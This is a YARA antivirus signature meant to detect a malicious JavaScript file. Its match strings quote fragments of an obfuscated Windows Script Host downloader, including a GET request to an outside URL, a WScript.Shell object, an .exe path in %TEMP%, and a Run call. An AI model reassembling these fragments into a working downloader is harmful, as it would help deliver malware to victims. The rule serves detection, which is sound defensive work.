rule sig_20160401_36ed980f9f2861d4fdf45826a683285e {
  meta:
    description = "datamaliciousorder - file 20160401_36ed980f9f2861d4fdf45826a683285e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "09127040853f53cfd1a92168f7cffd810c9d38edb85a1bdc13faf3b8c84d704b"

  strings:
    $s1  = "VsYpp[JzqIea](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function QxtUr(PlJm, BykMte){MfKj = MfKj * 1; return PlJm - BykMte;};" fullword ascii
    $s3  = "var UqMv = function JjDi() {return WScript[FcdIga](\"WScript\"+\".Shell\");}(), RxPc = 11;" fullword ascii
    $s4  = "if (VsYpp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WiSkb(){return TiRhz + \"\";};" fullword ascii
    $s6  = "function OvcGl() {return UqMv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hA4SJYdTwdMe.ex\" + \"e\";};" fullword ascii
    $s7  = "function XcSej() {return ((RtFd == true) && (RtFd == YcoBq)) ? 1 : MfKj;};" fullword ascii
    $s8  = "var RwQi = false;" fullword ascii
    $s9  = "}while (LfMsy);" fullword ascii
    $s10 = "var YcoBq = false;" fullword ascii
    $s11 = "var RtFd = false;" fullword ascii
    $s12 = "function CunLeg(JyDdr) {var ZxCy = (1, 2, 3, 4, 5, JyDdr); return ZxCy;};" fullword ascii
    $s13 = "return QxtUr(EruIn, WxwFa);" fullword ascii
    $s14 = "RtFd = true; " fullword ascii
    $s15 = "var IyoTa = new this[\"Date\"]();" fullword ascii
    $s16 = "YcoBq = true; " fullword ascii
    $s17 = "function YxcEsg(ExXke){UqMv[\"R\"+\"un\"](ExXke, MfKj, MfKj);};" fullword ascii
    $s18 = "function BvScf(){return FcdIga;};" fullword ascii
    $s19 = "function PjrUs(){return 23;};" fullword ascii
    $s20 = "function VynXwm()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}